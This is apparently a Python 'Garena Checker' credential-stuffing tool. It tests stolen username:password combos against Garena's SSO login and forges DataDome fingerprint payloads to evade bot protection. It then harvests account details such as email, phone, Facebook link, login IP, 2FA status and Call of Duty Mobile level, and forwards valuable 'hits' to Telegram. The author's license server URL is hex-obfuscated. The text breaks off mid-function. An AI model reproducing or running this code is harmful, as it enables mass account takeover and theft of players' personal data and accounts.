import hashlib
import requests
import time
import json
import os
import urllib.parse
from Crypto.Cipher import AES
import logging
import random
import cloudscraper
import colorama
import threading
from collections import Counter
import platform
import uuid
import sys
import urllib3
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_GLOBAL_SUBSCRIPTION_ACTIVE = False
_GLOBAL_DEVICE_ID = None
_GLOBAL_USER_NAME = None

TELEGRAM_BOT_TOKEN = None
TELEGRAM_CHAT_ID = None
TELEGRAM_ENABLED = False
THREAD_COUNT = 1
THREAD_SPEED = "normal"
BATCH_COUNT = 0

_ENCRYPTED_SUBSCRIPTION_API_URL_PART1 = "48747470733a2f2f61736878646561746831302e7831302e627a2f"
_ENCRYPTED_SUBSCRIPTION_API_URL_PART2 = "6170692e706870"

def _get_decrypted_subscription_api_url():
    try:
        part1 = bytes.fromhex(_ENCRYPTED_SUBSCRIPTION_API_URL_PART1).decode('utf-8')
        part2 = bytes.fromhex(_ENCRYPTED_SUBSCRIPTION_API_URL_PART2).decode('utf-8')
        return part1 + part2
    except Exception as e:
        logger.error(f"Critical error decrypting API URL: {e}")
        sys.exit(1)

def _check_integrity():
    return True

def get_device_id():
    dir_path = os.path.expanduser("~/.dont_delete_me")
    file_path = os.path.join(dir_path, "here.txt")
    user_name = ""
    if os.path.exists(file_path):
        logger.info("Existing device ID file found.")
        try:
            with open(file_path, 'r') as file:
                content = file.read().strip()
                if content and '_' in content:
                    parts = content.split('_', 1)
                    user_name = parts[0]
                    device_id = content
                    logger.info(f"Using existing device ID: {device_id} (User: {user_name})")
                    return device_id, user_name
                else:
                    logger.warning("Existing device ID file is malformed or empty, generating new one.")
        except IOError as e:
            logger.error(f"Error reading existing device ID file: {e}. Generating new one.")
    os.makedirs(dir_path, exist_ok=True)
    logger.info("Generating new device ID...")
    while True:
        user_name = input(f"{colorama.Fore.YELLOW}Enter your name (3-20 characters): {colorama.Style.RESET_ALL}").strip()
        if 3 <= len(user_name) <= 20:
            break
        logger.error("Name must be between 3 and 20 characters.")
    system_info = [
        platform.system(),
        platform.release(),
        platform.version(),
        platform.machine(),
        platform.processor()
    ]
    hardware_string = "-".join(system_info)
    unique_id = uuid.uuid5(uuid.NAMESPACE_DNS, hardware_string)
    device_hash = hashlib.sha256(unique_id.bytes).hexdigest()
    device_id = f"{user_name}_{device_hash[:8]}"
    try:
        with open(file_path, 'w') as file:
            file.write(device_id)
        logger.info(f"New device ID generated and saved: {device_id}")
    except IOError as e:
        logger.error(f"Error saving device ID to {file_path}: {e}. Please check permissions.")
    return device_id, user_name

def check_subscription(device_id, user_name):
    if not _check_integrity():
        logger.error("Integrity check failed. Exiting.")
        sys.exit(1)

    url = f"{_get_decrypted_subscription_api_url()}?device_id={device_id}&user_name={user_name}"
    try:
        response = requests.get(url, verify=False, timeout=15)
        response.raise_for_status()
        response_json = response.json()
        return response_json
    except requests.exceptions.RequestException as e:
        logger.error(f"Subscription server request failed: {e}")
        return {"status": "error", "message": "Subscription server request failed."}

def device_main():
    global _GLOBAL_SUBSCRIPTION_ACTIVE, _GLOBAL_DEVICE_ID, _GLOBAL_USER_NAME

    logger.info("Initializing PORTEQUE Checker...")

    if not _check_integrity():
        logger.error("Integrity check failed during initialization. Exiting.")
        sys.exit(1)

    device_id, user_name = get_device_id()
    _GLOBAL_DEVICE_ID = device_id
    _GLOBAL_USER_NAME = user_name

    logger.info(f"Checking subscription for Device ID: {device_id} (User: {user_name})")
    subscription_response = check_subscription(device_id, user_name)
    status = subscription_response.get("status")
    message = subscription_response.get("message", "No message")

    if status == "active":
        logger.info(f"Subscription Status: Active. Access granted! {message}")
        _GLOBAL_SUBSCRIPTION_ACTIVE = True
        input(f"\n{colorama.Fore.CYAN}Press Enter to proceed...{colorama.Style.RESET_ALL}")
        return True
    elif status in ["pending", "registered_pending"]:
        logger.warning(f"Subscription Status: Pending Approval. {message}")
        logger.info(f"Your Device ID: {device_id}")
    elif status == "expired":
        logger.error(f"Subscription Status: Expired. {message}")
        logger.info(f"Your Device ID: {device_id}")
    else:
        logger.error(f"Subscription Status Unknown: {status}. {message}")
        logger.info(f"Your Device ID: {device_id}")
    return False

colorama.init(autoreset=True)

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
    }
    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.codm_count = 0
        self.no_codm_count = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            if valid:
                self.valid_count += 1
                if has_codm:
                    self.codm_count += 1
                else:
                    self.no_codm_count += 1
                    
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
            else:
                self.invalid_count += 1
                
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'codm': self.codm_count,
                'no_codm': self.no_codm_count
            }
            
    def display_stats(self):
        stats = self.get_stats()
        return f"{colorama.Fore.CYAN}[LIVE STATS]{colorama.Fore.GREEN} VALID [{stats['valid']}]{colorama.Fore.RED} | INVALID [{stats['invalid']}]{colorama.Fore.GREEN} | CLEAN [{stats['clean']}]{colorama.Fore.YELLOW} | NOT CLEAN [{stats['not_clean']}]{colorama.Fore.BLUE} | CODM [{stats['codm']}]{colorama.Fore.MAGENTA} | NO CODM [{stats['no_codm']}]{colorama.Style.RESET_ALL}"

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookie(self):
        if os.path.exists('fresh_cookies.txt'):
            with open('fresh_cookies.txt', 'r') as f:
                valid_cookies = [c for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
            if valid_cookies:
                return random.choice(valid_cookies)
        return None
    
    def save_cookie(self, cookie):
        if not self.is_banned(cookie):
            with open('fresh_cookies.txt', 'a') as f:
                f.write(cookie + '\n')
            return True
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            input()
            new_datadome = get_datadome_cookie(session)
            if new_datadome:
                self.set_datadome(new_datadome)
                self._403_attempts = 0
                return True
            else:
                return False
        return False

def display_banner():
    banner = """
          e$$$$e.
       e$$$$$$$$$$e
     $$$$$$$$$$$$$$
     d$$$$$$$$$$$$$$b
     $$$$$$$$$$$$$$$$
    4$$$$$$$$$$$$$$$$F
    4$$$$$$$$$$$$$$$$F
     $$$" "$$$$" "$$$
     $$F   4$$F   4$$
     '$F   4$$F   4$"
      $$   $$$$   $P
      4$$$$$"^$$$$$%
       $$$$F  4$$$$
        "$$$ee$$$"
        . *$$$$F4
         $     .$
         "$$$$$$"
          ^$$$$
 4$$c       ""       .$$r
 ^$$$b              e$$$"
 d$$$$$e          z$$$$$b
4$$$*$$$$$c    .$$$$$*$$$r
 ""    ^*$$$be$$$*"    ^"
          "$$$$"
        .d$$P$$$b
       d$$P   ^$$$b
   .ed$$$"      "$$$be.
 $$$$$$P          *$$$$$$
4$$$$$P            $$$$$$"
 "*$$$"            ^$$P
    ""              ^"
    ( Garena Checker )
    Owner: @poqruette
    """
    print(banner)

def setup_telegram():
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
    
    print(f"\n{colorama.Fore.CYAN}📱 TELEGRAM NOTIFICATION SETUP{colorama.Style.RESET_ALL}")
    print("=" * 50)
    
    use_telegram = input("Do you want to enable Telegram notifications for high-level hits (101-400)? (y/n): ").strip().lower()
    
    if use_telegram == 'y':
        TELEGRAM_ENABLED = True
        TELEGRAM_BOT_TOKEN = input("Enter your Telegram Bot Token: ").strip()
        TELEGRAM_CHAT_ID = input("Enter your Chat ID: ").strip()
        
        config = {
            'telegram_enabled': True,
            'bot_token': TELEGRAM_BOT_TOKEN,
            'chat_id': TELEGRAM_CHAT_ID
        }
        
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)
    else:
        TELEGRAM_ENABLED = False

def load_telegram_config():
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
    
    if os.path.exists('config.json'):
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
                TELEGRAM_ENABLED = config.get('telegram_enabled', False)
                TELEGRAM_BOT_TOKEN = config.get('bot_token')
                TELEGRAM_CHAT_ID = config.get('chat_id')
        except:
            pass

def send_telegram_notification(account_data):
    if not TELEGRAM_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    
    try:
        bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
        
        codm_level = account_data.get('codm_level', 0)
        try:
            codm_level = int(codm_level)
        except:
            codm_level = 0
            
        if 101 <= codm_level <= 400:
            message = format_telegram_message(account_data)
            bot.send_message(TELEGRAM_CHAT_ID, message, parse_mode='HTML')
            
    except Exception:
        pass

def format_telegram_message(account_data):
    account = account_data.get('account', 'N/A')
    shells = account_data.get('shells', 'N/A')
    codm_info = account_data.get('codm_info', {})
    security = account_data.get('security', {})
    facebook = account_data.get('facebook', {})
    
    message = f"""
🚨 <b>NEW HIT DETECTED!</b> 🚨

📱 <b>Account Details:</b>
➤ Account: <code>{account}</code>
➤ Shells: {shells}

🎮 <b>CODM Info ({codm_info.get('region', 'N/A')}):</b>
➤ Nickname: {codm_info.get('nickname', 'N/A')}
➤ Level: {codm_info.get('level', 'N/A')}
➤ UID: {codm_info.get('uid', 'N/A')}
➤ Country: {codm_info.get('country', 'N/A')}

🛡️ <b>Security Status:</b>
➤ Mobile: {security.get('mobile', 'None')}
➤ Email: {security.get('email', 'None')}
➤ Facebook: {facebook.get('username', 'None')} - {facebook.get('link', 'None')}

<i>Config By ➤ @poqruette</i>
"""
    return message

def setup_threads():
    global THREAD_COUNT, THREAD_SPEED
    
    print(f"\n{colorama.Fore.CYAN}⚡ THREAD CONFIGURATION{colorama.Style.RESET_ALL}")
    print("=" * 50)
    print("[1] 1-3 Threads (Recommended)")
    print("[2] 4-6 Threads (Medium Risky)")
    print("[3] 7-10 Threads (Very Risky!)")
    print("[4] Normal Speed (Recommended)")
    
    choice = input("\nSelect thread option (1-4): ").strip()
    
    if choice == '1':
        THREAD_COUNT = random.randint(1, 3)
        THREAD_SPEED = "slow"
    elif choice == '2':
        THREAD_COUNT = random.randint(4, 6)
        THREAD_SPEED = "medium"
    elif choice == '3':
        THREAD_COUNT = random.randint(7, 10)
        THREAD_SPEED = "fast"
    elif choice == '4':
        THREAD_COUNT = 1
        THREAD_SPEED = "normal"
    else:
        THREAD_COUNT = 1
        THREAD_SPEED = "normal"

def format_account_output(account, status, details=None, codm_info=None, count=0):
    username_only = account.split(':')[0] if ':' in account else account
    
    if status == "success":
        output = f"{colorama.Fore.CYAN}[{count}] {colorama.Fore.WHITE}Checking {username_only}\n"
        output += f"{colorama.Fore.GREEN}-> Status: {status}{colorama.Style.RESET_ALL}\n"
        
        if details:
            output += f"   {colorama.Fore.YELLOW}-> Country: {details.get('country', 'N/A')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.YELLOW}-> Garena Shells: {details.get('shells', 'N/A')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.YELLOW}-> Mobile: {details.get('mobile', 'None')}{colorama.Style.RESET_ALL}\n"
            
            email = details.get('email', 'None')
            email_verified = details.get('email_verified', False)
            if email != 'None':
                email_status = f"{email} (Verified)" if email_verified else f"{email} (Not Verified)"
                output += f"   {colorama.Fore.YELLOW}-> Email: {email_status}{colorama.Style.RESET_ALL}\n"
            else:
                output += f"   {colorama.Fore.YELLOW}-> Email: None{colorama.Style.RESET_ALL}\n"
                
            output += f"   {colorama.Fore.YELLOW}-> FB Username: {details.get('fb_username', 'N/A')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.YELLOW}-> FB Link: {details.get('fb_link', 'N/A')}{colorama.Style.RESET_ALL}\n"
            
            last_login = details.get('last_login', {})
            output += f"   {colorama.Fore.YELLOW}-> Last Login: {last_login.get('date', 'N/A')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.YELLOW}-> Login Source: {last_login.get('source', 'N/A')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.YELLOW}-> IP: {last_login.get('ip', 'N/A')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.YELLOW}-> IP Country: {last_login.get('country', 'N/A')}{colorama.Style.RESET_ALL}\n"
            
            output += f"{colorama.Fore.CYAN}-> Connected Games:{colorama.Style.RESET_ALL}\n"
            games = details.get('game_info', [])
            for game in games:
                output += f"   {colorama.Fore.WHITE}-> {game}{colorama.Style.RESET_ALL}\n"
            
            if codm_info:
                output += f"{colorama.Fore.CYAN}-> CODM Info:{colorama.Style.RESET_ALL}\n"
                output += f"   {colorama.Fore.WHITE}-> CODM Nickname: {codm_info.get('codm_nickname', 'N/A')}{colorama.Style.RESET_ALL}\n"
                output += f"   {colorama.Fore.WHITE}-> CODM Level: {codm_info.get('codm_level', 'N/A')}{colorama.Style.RESET_ALL}\n"
                output += f"   {colorama.Fore.WHITE}-> CODM UID: {codm_info.get('uid', 'N/A')}{colorama.Style.RESET_ALL}\n"
                
            output += f"{colorama.Fore.CYAN}-> Security:{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.WHITE}-> Mobile Bound: {details.get('mobile_bound', 'False')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.WHITE}-> Authenticator: {details.get('authenticator', 'Disabled')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.WHITE}-> 2FA: {details.get('two_fa', 'Disabled')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.WHITE}-> Account Status: {details.get('account_status', 'Clean')}{colorama.Style.RESET_ALL}\n"
            output += f"   {colorama.Fore.MAGENTA}-> Config By @poqruette{colorama.Style.RESET_ALL}\n"
            
    else:
        output = f"{colorama.Fore.CYAN}[{count}] {colorama.Fore.WHITE}Checking {username_only}\n"
        if "error_auth" in status or "error_no_account" in status:
            output += f"{colorama.Fore.RED}-> Status: {status}{colorama.Style.RESET_ALL}\n"
        else:
            output += f"{colorama.Fore.YELLOW}-> Status: {status}{colorama.Style.RESET_ALL}\n"
    
    return output

def format_cookie_message(count, datadome):
    return f"{colorama.Fore.CYAN}[BATCH #{count}] {colorama.Fore.GREEN}NEW COOKIE FOUND! Setting Datadome: {datadome[:30]}...{colorama.Style.RESET_ALL}"

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                pass
        else:
            pass
    
    if cookie_dict:
        session.cookies.update(cookie_dict)

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3
    
    for attempt in range(retries):
        try:
            response = session.post(url, headers=headers, data=data, timeout=30)
            response.raise_for_status()
            
            try:
                response_json = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                if '=' in cookie_string and ';' in cookie_string:
                    datadome = cookie_string.split(';')[0].split('=')[1]
                else:
                    datadome = cookie_string
                    
                return datadome
            else:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                    
        except requests.exceptions.RequestException:
            if attempt < retries - 1:
                time.sleep(2)
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
    
    return None

def prelogin(session, account, datadome_manager):
    global _GLOBAL_SUBSCRIPTION_ACTIVE, _GLOBAL_DEVICE_ID
    
    if not _GLOBAL_SUBSCRIPTION_ACTIVE:
        return None, None, None

    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'connection': 'keep-alive',
        'host': 'sso.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
        'X-Device-ID': _GLOBAL_DEVICE_ID
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            if response.status_code == 403:
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, None
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, None
            
            new_datadome = None
            try:
                cookies_dict = response.cookies.get_dict()
                new_datadome = cookies_dict.get('datadome')
            except Exception:
                pass
            
            if 'error' in data:
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                return None, None, new_datadome
                
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, None
            else:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                
                if error_msg == 'error_auth':
                    return None
                elif 'captcha' in error_msg.lower():
                    time.sleep(3)
                    continue
                    
            return sso_key
            
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(2)
                
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        return token_data.get("access_token", "")
    except Exception:
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception:
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
